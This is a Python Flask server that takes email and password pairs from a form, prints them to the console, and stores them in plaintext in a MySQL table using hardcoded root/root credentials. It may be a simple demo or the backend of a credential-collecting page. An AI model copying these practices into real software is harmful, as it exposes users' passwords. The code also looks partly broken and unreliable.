from flask import Flask, redirect, url_for, request, render_template
from time import sleep
from mySQL_connector import create_server_connection, create_database, create_db_connection, execute_query, create_login_table, insert_to_login
import threading
import signal

app = Flask(__name__)
data_queue = []
global conn

@app.route('/index', methods = ['GET'])
def index():
    return render_template("index.html")

@app.route('/', methods = ['POST', 'GET'])
def login():
    if request.method == 'POST' or request.method == 'GET':
        password = request.form['password']
        print("PASSWORD:", password)
        email = request.form['email']
        print("EMAIL:", email)
        execute_query(conn, insert_to_login((email, password)))
        return "Data recieved."

@app.route('/pop', methods = ['POST', 'GET'])
def pop_from_queue():
    if len(data_queue) == 0:
        return ""
    else:
        tmp = data_queue.pop(0)
        return str(tmp)

@app.route('/is_empty', methods = ['POST', 'GET'])
def is_empty():
    return str(not bool(data_queue)) # returns false if the queue is empty

def catch_program_halt(signum, frame): # for when you cntrl + c from the program, closes all threads.
    print("The program has detected Ctrl + C on the keyboard. Exiting.")
    exit()

def main():
    # create connection to mysql server
    connection = create_server_connection(databaseURL, databaseRootUsername, databasePassword)
    
    # create database
    create_database_query = "CREATE DATABASE " + databaseName
    create_database(connection, create_database_query)

    # query for table creation
    login_table = create_login_table()

    # create the table we will store data into.
    connection = create_db_connection(databaseURL, databaseRootUsername, databasePassword, databaseName) # Connect to the Database
    execute_query(connection, login_table) # Execute our defined query

    global conn
    conn = connection

    try:
        signal.signal(signal.SIGINT, catch_program_halt)
    except:
        print("Could not use signal handler to detect for cntrl + c at end of program!")
        app.end()
        exit()

if __name__ == '__main__':
    databaseURL = "localhost"
    databaseRootUsername = "root"
    databasePassword = "root"
    databaseName = "form_results"
    main()
    app.run()